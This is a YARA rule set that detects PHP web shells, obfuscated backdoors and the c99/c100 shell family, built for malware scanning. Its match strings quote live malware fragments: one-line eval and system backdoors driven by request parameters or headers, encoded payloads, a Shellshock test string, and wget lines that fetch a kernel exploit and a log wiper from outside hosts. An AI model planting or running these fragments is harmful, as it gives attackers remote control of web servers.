/*
   YARA Rule Set
   Author: WatcherLab
   Date: 2019-01-01
   Identifier: php
*/

/* Rule Set ----------------------------------------------------------------- */

rule cipher_design {
   meta:
      description = "php - file cipher_design.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "62af3fadae7589d30890b2538c2e8177abc894b8639afbbbb8a43d68074a0e45"
   strings:
      $s1 = "riptID:ID/2016-02-23T12:57:52+00:00) (Generated on 2016-02-23 - http://cipherdesign.co.uk/service/php-obfuscator)" fullword ascii
      $s2 = "<?php // Copyright 2016 - Do not attempt to reverse engineer this file. Please contact us for details, quoting the ScriptID. (Sc" ascii
      $s3 = "<?php // Copyright 2016 - Do not attempt to reverse engineer this file. Please contact us for details, quoting the ScriptID. (Sc" ascii
      $s4 = "jenn(1P58Xn87Xn8$X)58VfHj1f8$ef8$e)87$)5(V$8$e?nv8OHUX_58V$8$V_n(X)5n$)Hj1nnU8n" fullword ascii
      $s5 = "NvZGUoc3RydHIoZnJlYWQoJE9JMEkwMU8xMElPSU9JMEksNzI0KSwnYVA/LDckLlJjWGx4aGV3ejVWKV9uOCpIT0Era0MmUWZkc0VLdig9cUpaSU40YkcwIy1URGpyZ3" ascii
      $s6 = "U5NkxGMVVAbXBvIVdTeUIlaXRNMzJZJywnQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Njc4OTAuLCEkJSYqKC" ascii
      $s7 = "JiJyk7JE8xT0lPMTAxMElPSTAxMDE9aW50dmFsKCcwMDIwNTgnKTtmc2VlaygkT0kwSTAxTzEwSU9JT0kwSSxpbnR2YWwoJzAwMDc5NCcpKTtldmFsKGJhc2U2NF9kZW" ascii
      $s8 = "$OI0IO10101OI0I01=__FILE__;$O10I0I01O1OI01OIOI=72;eval(base64_decode('JE9JMEkwMU8xMElPSU9JMEk9Zm9wZW4oJE9JMElPMTAxMDFPSTBJMDEsJ3" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      all of them
}

rule bypasses {
   meta:
      description = "php - file bypasses.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "ce739d65c31b3c7ea94357a38f7bd0dc264da052d4fd93a1eabb257f6e3a97a6"
   strings:
      $x1 = "// https://github.com/nbs-system/php-malware-finder/commit/47d86bf92eb15fe65dd4efbc04d0004856e88ddd#commitcomment-16355734" fullword ascii
      $s2 = "// https://rstforums.com/forum/topic/98500-php-malware-finder/?do=findComment&comment=615687" fullword ascii
      $s3 = "print_r(call_user_func_array($_POST['functie'], array($_POST['argv'])));" fullword ascii
      $s4 = "print_r($_POST['funct']($_POST['argv']));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule php_dodgy {
   meta:
      description = "php - file dodgy.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "2cf529f100823fd6e2a570363983bff24d60183b8dc68973242f2eeb26b69e04"
   strings:
      $x1 = "$c = \"env x='() { :;}; echo vulnerable' bash -c 'echo this is a test'\";" fullword ascii
      $s2 = "$d = \"<!--#exec cmd=\";" fullword ascii
      $s3 = "eval(base64_decode($_GET['lol']));" fullword ascii
      $s4 = "curl_setopt($ch, CURLOPT_URL, \"file:file:////etc/passwd\");" fullword ascii
      $s5 = "ini_get (  'disable_functions');" fullword ascii
      $s6 = "$c = \"AddType application/x-httpd-php .htaccess\"" fullword ascii
      $s7 = "$b = \"IIS://localhost/w3svc\";" fullword ascii
      $s8 = "set_magic_quotes_runtime ( 0);" fullword ascii
      $s9 = "include  ( 'lol.png');" fullword ascii
      $s10 = "ini_set(\"disable_functions\", \"\");" fullword ascii
      $s11 = "curl_init  ( \"file:///etc/parla\");" fullword ascii
      $s12 = "ini_restore(\"allow_url_include\");" fullword ascii
      $s13 = "$a= \"SetHandler application/x-httpd-php\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and 4 of them
}


rule php_Module {
   meta:
      description = "php - file Module.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "7d8fdb693f33b2fd53e2b5819357c1f912d183a4e64681a34dad56bedd9101cb"
   strings:
      $x1 = "* the URL `http://localhost/path/to/index.php?r=webshell`" fullword ascii
      $x2 = "* With the above configuration, you will be able to access web shell in your browser using" fullword ascii
      $s3 = "* @var callable A valid PHP callback that returns true if user is allowed to use web shell and false otherwise" fullword ascii
      $s4 = "* To use web shell, include it as a module in the application configuration like the following:" fullword ascii
      $s5 = "* @var array URL to use for `quit` command. If not set, `quit` command will do nothing." fullword ascii
      $s6 = "Yii::warning('Access to web shell is denied due to IP address restriction. The requested IP is ' . $ip, __METHOD__);" fullword ascii
      $s7 = "* The default value is `['127.0.0.1', '::1']`, which means the module can only be accessed" fullword ascii
      $s8 = "* This is the main module class for the web shell module." fullword ascii
      $s9 = "public $controllerNamespace = 'samdark\\webshell\\controllers';" fullword ascii
      $s10 = "*         'webshell' => ['class' => 'samdark\\webshell\\Module']," fullword ascii
      $s11 = "* Each array element represents a single IP filter which can be either an IP address" fullword ascii
      $s12 = "* or an address with wildcard (e.g. 192.168.0.*) to represent a network segment." fullword ascii
      $s13 = "* @author Alexander Makarov <sam@rmcreative.ru>" fullword ascii
      $s14 = "* @return boolean whether the module can be accessed by the current user" fullword ascii
      $s15 = "* @var array the list of IPs that are allowed to access this module." fullword ascii
      $s16 = "* @var string path to `yii` script" fullword ascii
      $s17 = "if ($filter === '*' || $filter === $ip || (($pos = strpos($filter, '*')) !== false && !strncmp($ip, $filter, $pos)))" fullword ascii
      $s18 = "if ($filter === '*' || $filter === $ip || (($pos = strpos($filter, '*')) !== false && !strncmp($ip, $filter, $pos))) {" fullword ascii
      $s19 = "Yii::warning('Access to web shell is denied due to checkAccessCallback.', __METHOD__);" fullword ascii
      $s20 = "namespace samdark\\webshell;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      1 of ($x*) and 4 of them
}



rule php_ninja {
   meta:
      description = "php - file ninja.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "1358fe557d6dc3f1a746017d1f2fcb01cbda3c7060f6f9a10a08553060e3686f"
   strings:
      $s1 = "<?$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule sucuri_2014_04 {
   meta:
      description = "php - file sucuri_2014_04.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "81388c8cc99353cdb42572bb88df7d3bd70eefc748c2fa4224b6074aa8d7e6a2"
   strings:
      $s1 = "/* https://blog.sucuri.net/2014/04/php-callback-functions-another-way-to-hide-backdoors.html */" fullword ascii
      $s2 = "@array_diff_ukey(@array((string)$_REQUEST['password']=>1), @array((string)stripslashes($_REQUEST['re_password'])=>2),$_REQUEST['" ascii
      $s3 = "login']);" fullword ascii
      $s4 = "@array_diff_ukey(@array((string)$_REQUEST['password']=>1), @array((string)stripslashes($_REQUEST['re_password'])=>2),$_REQUEST['" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule online_php_obfuscator {
   meta:
      description = "php - file online_php_obfuscator.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "2618cb65de5c5d80175e584060394abe2c78362efa4b7188a4f8124205ad9000"
   strings:
      $s1 = "\\x63\\x6f\\x64\\x65\\x28\\x24\\x70\\x61\\x79\\x6c\\x6f\\x61\\x64\\x29\\x2c\\x30\\x29\\x29\\x29\",'.'); ?>" fullword ascii
      $s2 = "<?php $payload=\"83QPy0p0t0hPNs6pSnEPK/F2DkoLMggLDa9MKfcyNCjwLzfwjorIKEhxKbYFAA==\";preg_replace('/.*/e',\"\\x65\\x76\\x61\\x6c" ascii
      $s3 = "<?php $payload=\"83QPy0p0t0hPNs6pSnEPK/F2DkoLMggLDa9MKfcyNCjwLzfwjorIKEhxKbYFAA==\";preg_replace('/.*/e',\"\\x65\\x76\\x61\\x6c" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}



rule ajaxshell {
   meta:
      description = "php - file ajaxshell.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "41b3f472978109cfb97abbcde05c81bf9085c356e7f890f805e1efd078bdf093"
   strings:
      $x1 = "print \"Ajax Command Shell by <a href=http://www.ironwarez.info>Ironfist</a>.<br>Version $version\";" fullword ascii
      $x2 = "<b style=\"cursor:crosshair\" onclick=\"set_tab('cmd');\">[Execute command]</b> " fullword ascii
      $x3 = "<title>Command Shell ~ <?php print getenv(\"HTTP_HOST\"); ?></title>" fullword ascii
      $x4 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword ascii
      $x5 = "<a href=\"http://www.milw0rm.com\" target=_blank>milw0rm</a>" fullword ascii
      $x6 = "If one of the command execution functions work, the shell will function fine. " fullword ascii
      $x7 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword ascii
      $s8 = "&nbsp;&nbsp;&nbsp;<form name=\"cmdform\" onsubmit=\"return runcommand(document.cmdform.command.value,'GET');\">" fullword ascii
      $s9 = "<b><font size=3>Ajax/PHP Command Shell</b></font><br>by Ironfist" fullword ascii
      $s10 = "print '<b><font size=7>Ajax/PHP Command Shell</b></font>" fullword ascii
      $s11 = "//Execute any other command" fullword ascii
      $s12 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword ascii
      $s13 = "if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {" fullword ascii
      $s14 = "<a href=\"http://www.ironwarez.info\" target=_blank>SharePlaza</a>" fullword ascii
      $s15 = "'clear','GET'); runcommand ('listdir \".realpath($directory).\"','GET'); \\\">\".$directory.\"</b><br>\";" fullword ascii
      $s16 = "\"&filecontent=\" + encodeURI( document.getElementById(\"area1\").value );" fullword ascii
      $s17 = "function runcommand(urltoopen,action,contenttosend){" fullword ascii
      $s18 = "print \"<b>\".get_current_user().\"~# </b>\". htmlspecialchars($cmd).\"<br>\";" fullword ascii
      $s19 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST['filecontent']))" fullword ascii
      $s20 = "$target_path = $target_path . basename( $_FILES['uploadedfile']['name']); " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      1 of ($x*) and 4 of them
}


rule exceptions {
   meta:
      description = "php - file exceptions.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "f6c109e526cba3f1d39f1e06cc9efa47d848098bc70c8188769f79e3eaadb650"
   strings:
      $s1 = "$ksyweqahwz = 95; function ngomynsz($jkvdve, $swxidbkzpw){$az" fullword ascii
      $s2 = "F\";eval/*k*/(ngomynsz($fuwkgtdbkv, $jgzzljfjj));?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      all of them
}







rule php_nano {
   meta:
      description = "php - file nano.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "d9b5df6498a049a6afe2ef91d2cab7b8caa7d48d50757faf11cd49d2cd9b3918"
   strings:
      $s1 = "<?$x=$_GET;($x[p]=='_'?$x[f]($x[c]):y);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule php_freepbx {
   meta:
      description = "php - file freepbx.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "342519a43bb2597961a682db7387ee09e475f4230cd2c735cb8ec32c43ff0bc8"
   strings:
      $s1 = "echo \"login correct" fullword ascii
      $s2 = "if ($SERVER[\"REMOTEADDR\"]==\"178.162.201.166\" && md5($REQUEST['secure'])==\"7f02b0ae0869cc5aa38cd7ca6c767c92\"){ system($REQU" ascii
      $s3 = "if(md5($_REQUEST[\"mgp\"])==\"4f6e5768b76809bc99bf278494b5f352\")" fullword ascii
      $s4 = "if ($SERVER[\"REMOTEADDR\"]==\"178.162.201.166\" && md5($REQUEST['secure'])==\"7f02b0ae0869cc5aa38cd7ca6c767c92\"){ system($REQU" ascii
      $s5 = "@system($_REQUEST[\"c\"]);" fullword ascii
      $s6 = "B8XC4oZ2lmfEdJRnxqcGd8anBlZ3xwbmd8Y3NzfGpzfHN3Znx0eHR8aWNvfHR0Znxzdmd8ZW90fHdvZmZ8d2F2fG1wM3xhYWN8b2dnfHdlYm0pJHxib290c3RyYXBcLm" ascii
      $s7 = "4f6e5768b76809bc99bf278494b5f352" ascii
      $s8 = "FtZSxwYXNzd29yZF9zaGExLHNlY3Rpb25zKSBWQUxVRVMgKCdtZ2tuaWdodCcsJzMzYzdhNGRmNDZiMWE5ZjdkNGE0NjM2ZDQ3Njg0OTIwNWEwNGM2YjcnLCcqJyk7Ig" ascii
      $s9 = "system(base64_decode(\"bXlzcWwgYGdyZXAgQU1QREIgL2V0Yy9hbXBvcnRhbC5jb25mfGdyZXAgIlVTRVJcfFBBU1NcfE5BTUUifCBzZWQgJ3MvQU1QREJVU0VSL" ascii
      $s10 = "ecmd']); }" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}


rule phpencode {
   meta:
      description = "php - file phpencode.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "25fd7888fe0a33cb1c7c00151de1ed045c096a06d0cb9d27f898d699abd767a8"
   strings:
      $s1 = "<?php $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode(\"aWYoIWZ1bmN0aW9uX2V4aXN0c" ascii
      $s2 = "<?php $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode(\"aWYoIWZ1bmN0aW9uX2V4aXN0c" ascii
      $s3 = "3f112c39fc9a88cccda9ea4c998267079eeS03OyFcoriwuSc3VUIl3dw2JVi9Qj9W0BgA=" fullword ascii
      $s4 = "7bac13f112c39fc9a88cccda9ea4c998267079ee" ascii
      $s5 = "giWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LD" ascii
      $s6 = "IzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJG" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule php_include {
   meta:
      description = "php - file include.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "d4e2552ff61f665914796672fd97740e47336da6a8c3b29f90b1cf6b2015bea8"
   strings:
      $s1 = "3X\\x2fm\\x6fd\\x75l\\x65s\\x2fn\\x6fd\\x65/\\x66a\\x76i\\x63o\\x6e_\\x31a\\x33f\\x384\\x2ei\\x63o\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_awvjtnz {
   meta:
      description = "php - file awvjtnz.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "f7746856679cf372a6a70a4d1ca989961e6a875a2c10f51fee9e8e43fe2f419c"
   strings:
      $s1 = "x22)gj!|!*nbsbq%)32d($n)-1);} @error_reporting(0); $jojtdkr = implode(array_map(\"dudovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>" fullword ascii
      $s2 = "x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7ww**WYsboepn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985:]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m,\"" fullword ascii
      $s3 = "xw)##Qtjw)#]82#-#!#-%tmw)%t#W~!Ydrr)%rxB%epnbss!>!bssb2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~" fullword ascii
      $s4 = "# Unpacks at least 5 levels deep, including references to variables from previous levels of expansion." fullword ascii
      $s5 = "]37]276197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98]epdof./#@#/qp%>5h%!<*::::::-1246767~6<Cw6<pd%w6Z6<.5`hA" fullword ascii
      $s6 = "x24#-!#]y38#-!%w:**<\")));$bhlpzbl = $oqtpxpv]275]y83]248]y83]256]y81]265]y72]254]y76#<!%w:!>!(%w:!>!" fullword ascii
      $s7 = "x7fw6*CWtfs%)7gj6<*8]225]241]334]368]322]3]364]6]283]427]36]373P6]R17,67R37,#/q%>U<#16,47R57,27Rpd%6<pd%w6Z6<.3`hA" fullword ascii
      $s8 = "$xozybdtes,$awvjtnz,$nkttprcq)); $jdxccsyh=$awvjtnz; $ympifwn(\"\"); $ympifwn=(599-478); $awvjtnz=$ympifwn-1; ?>" fullword ascii
      $s9 = "`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}%tmw!>!#]y84]275]y83]27~!%z!>2<!gps)%j>1<%j=6[%ww)))) { $GLOBALS[\"" fullword ascii
      $s10 = "x27)fepdof.)f3ldfidk!~!<**qp%!-uyfu%)3of)fepdof`5<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)lhA!osvufs!~<3,j%>j%!*3!" fullword ascii
      $s11 = "x22!pd%)!gj}Z;W&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)ebfsX" fullword ascii
      $s12 = "y<Cb*[%h!>!%tdz)%bbT-36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]3I7jsv%7UFH#" fullword ascii
      $s13 = "x61\"]h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!^<!Ce*[!%cIjQeTQcOc/#00o#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}" fullword ascii
      $s14 = "x24/%tjws:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:" fullword ascii
      $s15 = "x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!g(\"\", $jojtdkr); $bhlpzbl();}}W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr" fullword ascii
      $s16 = "x6e\"; function dhyvbmt($n){return chr(orx27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!" fullword ascii
      $s17 = "# This is a sample of PHP malware discovered 2017/11/15." fullword ascii
      $s18 = "x24<!4-bubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]7]y86]267]y74]275]y7:]268]y7f#<!%tww!>!" fullword ascii
      $s19 = "x27Y%6K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:npd#)tutjyf`opjudovg" fullword ascii
      $s20 = "# Also seen with other variable names and constants altered." fullword ascii
   condition:
      uint16(0) == 0x2023 and filesize < 20KB and
      8 of them
}

rule php_guidtz {
   meta:
      description = "php - file guidtz.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "ad9edfebc9a25d5c7cde0633add36bdf86d6902552db8970ea2b7a4566922741"
   strings:
      $s1 = "* {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}" fullword ascii
      $s2 = "* This file is used by the wp-config.php creation script during the" fullword ascii
      $s3 = "* Codex page. You can get the MySQL settings from your web host." fullword ascii
      $s4 = "* This file has the following configurations: MySQL settings, Table Prefix," fullword ascii
      $s5 = "* Secret Keys, and ABSPATH. You can find more information by visiting" fullword ascii
      $s6 = "6600000000" ascii
      $s7 = "6100000000" ascii
      $s8 = "* The base configurations of the WordPress." fullword ascii
      $s9 = "@error_reporting(0);@ini_set('display_errors',false);defined('" fullword ascii
      $s10 = "nL/79p9HxrWSVUF5cDA4Zm9WOUpIeEdpWk9tTmpCZXRLYjNTdTJYaHdZYW56TEQ3RlE2UnJQbEM0" fullword ascii
      $s11 = "nq8fN7MUVSv1tTSyNcwyBpbCmdIOpw1ldVE/rJeGZP0Yd+uXLEPcWmIri5X9Ok7DvgbQaJBzDEuw" fullword ascii
      $s12 = "* installation. " fullword ascii
      $s13 = "']('6600000000')); $" fullword ascii
      $s14 = "* @package WordPress" fullword ascii
      $s15 = "']('6100000000')); $" fullword ascii
      $s16 = "LMuG/JvbOA4PutniKbRKTRIUUinnSh1btI4ymEUJA7X9h58//Q+Pal3JKjFBzWwacNmkzFQzv3KD" fullword ascii
      $s17 = "27403321\"]=" fullword ascii
      $s18 = "l/cMReYk5N8aa8kEB9zu0J3eqLx2jM7Wryu0XmngrcHuhMgVV1JgRaSP3Ol0VZWPhsulRmsZwJpn" fullword ascii
      $s19 = "R+WRYSQG6Hoax5m0mN54Aj0+evhpYYkFMR0Nh93nM/f3tyqNnUrjcXKiUsG7GDmgeJSZ4t7sdx/5" fullword ascii
      $s20 = "#!/usr/bin/php -q" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule php_srt {
   meta:
      description = "php - file srt.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "cfa341f6c5440fe04c81cafda00babb4d7f7b2a38d35769178ef366eba8fa696"
   strings:
      $s1 = "ob_start(function ($c,$d){register_shutdown_function('assert',$c);}); " fullword ascii
      $s2 = "echo $_REQUEST['pass']; " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule php_smart {
   meta:
      description = "php - file smart.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "6b5f416ae0ef6ec058353b2d806dc70ae020719e2bf8b52036e54a204529e721"
   strings:
      $s1 = "<?php extract($_REQUEST); @die($ctime($atime));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_novahot {
   meta:
      description = "php - file novahot.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "6270bb35d95c87b5135868da21c0ad84d6155cd5f7ccb9dbe517cd50b5b8f9fc"
   strings:
      $x1 = "# otherwise, execute a shell command" fullword ascii
      $s2 = "# if `cmd` is a trojan payload, execute it" fullword ascii
      $s3 = "# execute the command" fullword ascii
      $s4 = "# File-download payload" fullword ascii
      $s5 = "function payload_download ($cwd, $args) {" fullword ascii
      $s6 = "if (!isset($post['auth']) || $post['auth'] !== PASSWORD) {" fullword ascii
      $s7 = "$post = json_decode(file_get_contents('php://input'), true);" fullword ascii
      $s8 = "# open the file as binary, and base64-encode its contents" fullword ascii
      $s9 = "$stderr = [ 'Could not download file.', $e->getMessage() ];" fullword ascii
      $s10 = "# TODO: Change this password. Don't leave the default!" fullword ascii
      $s11 = "# File-upload payload" fullword ascii
      $s12 = "$stdout = base64_encode(file_get_contents($args['file']));" fullword ascii
      $s13 = "# Override the default error handling to:" fullword ascii
      $s14 = "function payload_upload ($cwd, $args) {" fullword ascii
      $s15 = "$cmd = \"cd $cwd; {$post['cmd']} 2>&1; pwd\";" fullword ascii
      $s16 = "exec($cmd, $output);" fullword ascii
      $s17 = "# To test this trojan locally, run the following in the directory containing " fullword ascii
      $s18 = "function payload_autodestruct ($cwd, $args) {" fullword ascii
      $s19 = "if (function_exists($post['cmd'])) {" fullword ascii
      $s20 = "file_put_contents( $args['dst'], base64_decode($args['data']));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      1 of ($x*) and 4 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _c100_c99_cyb3rsh3ll_0 {
   meta:
      description = "php - from files c100.php, c99.php, cyb3rsh3ll.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "6ffef45e178b189c9eb486457dc6ae71a2e62be5724adc598d25585a6c0c6c1a"
      hash2 = "03b0b693f76b22e54eea716997b98b9a105c82b031439f72663d7b0209bd1f7d"
      hash3 = "22fe9c09c988fc7a1388240bedbaf1ad849f4e5f348566575219d7df041a3cc9"
   strings:
      $x1 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");}" fullword ascii
      $x2 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";" fullword ascii
      $x3 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?ph" ascii
      $x4 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget insta" fullword ascii
      $x5 = "displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\"));" fullword ascii
      $x6 = "echo \"<br><br><input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Dump\\\"><br><br><b><sup>1</sup></b> - all, if empty\";" fullword ascii
      $x7 = "if ($ext == \"c\") {$retgcc = myshellexec(\"gcc -o \".$binpath.\" \".$srcpath); @unlink($srcpath);}" fullword ascii
      $x8 = "if ($ext == \"c\") {$retgcc = myshellexec(\"gcc -o \".$binpath.\" \".$srcpath);  @unlink($srcpath);}" fullword ascii
      $x9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $x10 = "echo \"<b>Download: </b>&nbsp;<input type=\\\"checkbox\\\" name=\\\"sql_dump_download\\\" value=\\\"1\\\" checked><br><br>\";" fullword ascii
      $x11 = "else {echo \"<b>Execution command</b>\"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}" fullword ascii
      $x12 = "# MySQL version: (\".mysql_get_server_info().\") running on \".getenv(\"SERVER_ADDR\").\" (\".getenv(\"SERVER_NAME\").\")\".\"" fullword ascii
      $x13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $x14 = "<OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If " fullword ascii
      $x15 = "$sql_passwd).\"&sql_server=\".htmlspecialchars($sql_server).\"&sql_port=\".htmlspecialchars($sql_port).\"&sql_act=processes\");" fullword ascii
      $s16 = "<center><a href=\\\"\".$surl.\"act=processes&grep=\".basename($binpath).\"\\\"><u>View datapipe process</u></a></center>\";}" fullword ascii
      $s17 = "echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" name=" ascii
      $s18 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s19 = "if (file_get_contents($v)) {echo \"<b><font color=red>You can't crack winnt passwords(\".$v.\") </font></b><br>\";}" fullword ascii
      $s20 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 800KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _c100_c99_1 {
   meta:
      description = "php - from files c100.php, c99.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "6ffef45e178b189c9eb486457dc6ae71a2e62be5724adc598d25585a6c0c6c1a"
      hash2 = "03b0b693f76b22e54eea716997b98b9a105c82b031439f72663d7b0209bd1f7d"
   strings:
      $x1 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)" fullword ascii
      $x2 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\">" fullword ascii
      $x3 = "<OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)" fullword ascii
      $s4 = "echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with login " ascii
      $s5 = "<OPTION VALUE=\"which wget curl w3m lynx\">Downloaders?" fullword ascii
      $s6 = "echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with login " ascii
      $s7 = "ho urlencode($d); ?>\"><b>Command execute</b></a> ::</b></p></td></tr>" fullword ascii
      $s8 = "if ($fqb_onlywithsh) {$TRUE = (!in_array($sh,array(\"/bin/FALSE\",\"/sbin/nologin\")));}" fullword ascii
      $s9 = "if (empty($login_txt)) {$login_txt = strip_tags(ereg_replace(\"&nbsp;|<br>\",\" \",$donated_html));}" fullword ascii
      $s10 = "xp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>" fullword ascii
      $s11 = "if (($_SERVER[\"PHP_AUTH_USER\"] != $login) or (md5($_SERVER[\"PHP_AUTH_PW\"]) != $md5_pass))" fullword ascii
      $s12 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>Enter: </b><form action=\"<?php echo $surl; ?>\"><input type=hidden" ascii
      $s13 = "<OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">USER WITHOUT PASSWORD!" fullword ascii
      $s14 = "echo \"<form action=\\\"\".$surl.\"\\\"><input type=hidden name=act value=\\\"ftpquickbrute\\\"><br>Read first: <input type=text" ascii
      $s15 = "if (@ftp_login($sock,$login,$pass))" fullword ascii
      $s16 = "if ($success == 0) {echo \"No success. connections!\"; $fqb_log .= \"No success. connections!\\r\\n\";}" fullword ascii
      $s17 = "<div align=\"center\">Php Safe-Mode Bypass (Read Files)" fullword ascii
      $s18 = "if (!$fp) {echo \"Can't get /etc/passwd for password-list.\";}" fullword ascii
      $s19 = "array(\"<b>Proc.</b>\",$surl.\"act=processes&d=%d\")," fullword ascii
